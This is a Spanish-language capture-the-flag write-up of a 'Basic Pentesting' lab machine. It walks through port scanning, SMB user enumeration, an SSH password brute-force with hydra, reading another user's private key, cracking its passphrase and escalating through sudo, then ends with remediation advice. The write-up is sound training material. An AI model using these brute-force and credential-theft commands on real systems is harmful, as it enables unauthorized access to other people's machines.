# Basic Pentesting
## Initial Scan
```
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
```
## Enum
### HTTP 
#### Gobusting
```
/development (Status: 301)
```
Dentro encontramos dos archivos distintos
#### Dev.txt
```

2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```
#### J.txt
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

### SMB
Es el momento de enumerar SMB :v, para ello usamos enum4linux
```
enum4linux -a IP
```
Y esto nos retorna 2 usuarios
```
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```
## Exploit
Bruteforcing time, tenemos dos users y sabemos como usarlos, admas por la nota anterior suponemos que la contraseña de j es común
```
 hydra -L users.txt -p /home/pj/rockyou.txt ssh://10.10.30.137
```
Finalmente la pass es armando

### Privesc

Desde jan podemos movernos lateralmente hacia kay para ello leemos el id_rsa de la carpeta de kay
```
cat /home/kay/.ssh/id_rsa
```
Crackeamos la clave con ssh2john + rockyou y tenemos que es
```
beeswax          (key_rsa)
```
Una vez dentro tenemos una copia de la clave de kay en local , la leemos y gracias a esto podemos ver que como kay podemos ejecutar cualquier comando como sudo.

Al llegar a /root encontre el siguiente mensaje pero no fui capaz de encontrar la segunda
```
There are two ways (that I'm aware of) to gain a shell, and two ways to privesc.
```
# Analisis de la intrusión
### Information Leak 
Mantener comunciaciones por canales poco seguros como por ejemplo archivos de texto sobre asuntos relativos a el servidor puede ser muy peligroso y mas si se habla de metodos de acceso al servidor
### SMB Null Sesion
Permitir inicio de sesion mediante null sesion de cara a SMB causa potenciales problemas a la seguridad del servidor permitiendo la enumeración de usuarios
### Password polices
Una politica de contraseñas mas robusta nos habria dificultado por no decir imposibilitado el acceso via ssh, pero la contraseña tanto de jan como de la clave privada de key estaban presentes en rockyou
### Bruteforce SSH allowed
Pese a tener una contraseña poco segura el ataque habria sido imposible si hubiese existido alguna proteccion contra bruteforcing en la propia máquina
# Soluciones
### Information Leak
Mover las conversaciones de /development a un servicio de comunicación seguro dentro de la máquina podria haber dificultado la intrusión (que no impedirla)
### SMB Null Session
Añadir las dos siguientes lineas a smb.conf deberia mitigar esta enumeracion lo cual dificultaria el reconocimiento de la misma por parte de los atacantes
```
map to guest = Never
restrict anonymous = 2
```
### Bruteforce SSH allowed
La instalación y configuración de un servicio como fail2ban previene la posibilidad de bruteforcear las creds.
